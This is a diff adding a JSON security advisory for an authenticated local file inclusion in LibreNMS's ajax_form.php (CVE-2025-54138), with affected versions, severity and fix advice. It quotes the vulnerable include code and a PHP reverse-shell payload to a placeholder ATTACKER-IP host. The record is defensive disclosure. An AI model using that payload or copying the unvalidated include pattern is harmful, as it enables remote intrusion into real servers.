@@ -1,0 +1,215 @@
+{
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-gq96-8w38-hhj2/GHSA-gq96-8w38-hhj2.json"
+      },
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "librenms/librenms",
+        "purl": "pkg:composer/librenms/librenms"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "25.7.0"
+            }
+          ],
+          "type": "ECOSYSTEM"
+        }
+      ],
+      "versions": [
+        "1.19",
+        "1.20",
+        "1.20.1",
+        "1.21",
+        "1.22",
+        "1.22.01",
+        "1.23",
+        "1.24",
+        "1.25",
+        "1.26",
+        "1.27",
+        "1.28",
+        "1.29",
+        "1.30",
+        "1.30.01",
+        "1.31",
+        "1.31.01",
+        "1.31.02",
+        "1.31.03",
+        "1.32",
+        "1.32.01",
+        "1.33",
+        "1.33.01",
+        "1.34",
+        "1.35",
+        "1.36",
+        "1.36.01",
+        "1.37",
+        "1.38",
+        "1.39",
+        "1.40",
+        "1.41",
+        "1.42",
+        "1.42.01",
+        "1.43",
+        "1.44",
+        "1.45",
+        "1.46",
+        "1.47",
+        "1.48",
+        "1.48.1",
+        "1.49",
+        "1.50",
+        "1.50.1",
+        "1.51",
+        "1.52",
+        "1.53",
+        "1.53.1",
+        "1.54",
+        "1.55",
+        "1.56",
+        "1.57",
+        "1.58",
+        "1.58.1",
+        "1.59",
+        "1.60",
+        "1.61",
+        "1.62",
+        "1.62.1",
+        "1.62.2",
+        "1.63",
+        "1.64",
+        "1.64.1",
+        "1.65",
+        "1.65.1",
+        "1.66",
+        "1.67",
+        "1.68",
+        "1.69",
+        "1.70.0",
+        "1.70.1",
+        "21.1.0",
+        "21.10.0",
+        "21.10.1",
+        "21.10.2",
+        "21.11.0",
+        "21.12.0",
+        "21.12.1",
+        "21.2.0",
+        "21.3.0",
+        "21.4.0",
+        "21.5.0",
+        "21.5.1",
+        "21.6.0",
+        "21.7.0",
+        "21.8.0",
+        "21.9.0",
+        "21.9.1",
+        "22.1.0",
+        "22.10.0",
+        "22.11.0",
+        "22.12.0",
+        "22.2.0",
+        "22.2.1",
+        "22.2.2",
+        "22.3.0",
+        "22.4.0",
+        "22.4.1",
+        "22.5.0",
+        "22.6.0",
+        "22.7.0",
+        "22.8.0",
+        "22.9.0",
+        "23.1.0",
+        "23.1.1",
+        "23.10.0",
+        "23.11.0",
+        "23.2.0",
+        "23.4.0",
+        "23.4.1",
+        "23.5.0",
+        "23.6.0",
+        "23.7.0",
+        "23.8.0",
+        "23.8.1",
+        "23.8.2",
+        "23.9.0",
+        "23.9.1",
+        "24.1.0",
+        "24.10.0",
+        "24.10.1",
+        "24.11.0",
+        "24.12.0",
+        "24.2.0",
+        "24.3.0",
+        "24.4.0",
+        "24.4.1",
+        "24.5.0",
+        "24.6.0",
+        "24.7.0",
+        "24.8.0",
+        "24.8.1",
+        "24.9.0",
+        "24.9.1",
+        "25.1.0",
+        "25.2.0",
+        "25.3.0",
+        "25.4.0",
+        "25.5.0",
+        "25.6.0"
+      ]
+    }
+  ],
+  "aliases": [
+    "CVE-2025-54138"
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-98"
+    ],
+    "github_reviewed": true,
+    "github_reviewed_at": "2025-07-21T21:10:51Z",
+    "nvd_published_at": null,
+    "severity": "HIGH"
+  },
+  "details": "LibreNMS 25.6.0 contains an architectural vulnerability in the `ajax_form.php` endpoint that permits Local File Inclusion (LFI) based on user-controlled POST input. \n\nThe application directly uses the `type` parameter to dynamically include `.inc.php` files from the trusted path `includes/html/forms/`, without validation or allowlisting:\n\n```php\nif (file_exists('includes/html/forms/' . $_POST['type'] . '.inc.php')) {\n    include_once 'includes/html/forms/' . $_POST['type'] . '.inc.php';\n}\n```\nThis pattern introduces a latent Remote Code Execution (RCE) vector if an attacker can stage a file in this include path \u2014 for example, via symlink, development misconfiguration, or chained vulnerabilities.\n\n>  This is not an arbitrary file upload bug. But it does provide a powerful execution sink for attackers with write access (direct or indirect) to the include directory.\n\n# Conditions for Exploitation\n\n- Attacker must be authenticated    \n- Attacker must control a file at `includes/html/forms/{type}.inc.php` (or symlink)        \n\n# Example Impact (RCE)\n\nIf a PHP file or symlinked shell is staged in the include path, an attacker can achieve full remote code execution under the `librenms` user context:\n\n```php\n<?php system('/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1\"'); ?>\n```\nhttps://github.com/user-attachments/assets/deb9ccd2-101c-4172-89b1-b840b7ed3812\n\n\n---\n\n# Recommended Fix\n\n- Implement strict allow listing or hardcoded routing instead of dynamically including user-supplied filenames. \n- Avoid passing raw POST input into `include_once`.\n- Ensure the inclusion path is immutable and outside attacker control (e.g., avoid variable expansion into trusted paths).",
+  "id": "GHSA-gq96-8w38-hhj2",
+  "modified": "2025-07-21T21:42:13.311051Z",
+  "published": "2025-07-21T21:10:51Z",
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/librenms/librenms/security/advisories/GHSA-gq96-8w38-hhj2"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/librenms/librenms/pull/17990"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/librenms/librenms/commit/ec89714d929ef0cf2321957ed9198b0f18396c81"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/librenms/librenms"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/librenms/librenms/releases/tag/25.7.0"
+    }
+  ],
+  "schema_version": "1.6.0",
+  "severity": [
+    {
+      "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "type": "CVSS_V3"
+    }
+  ],
+  "summary": "LibreNMS has Authenticated Local File Inclusion in ajax_form.php that Allows RCE"
+}
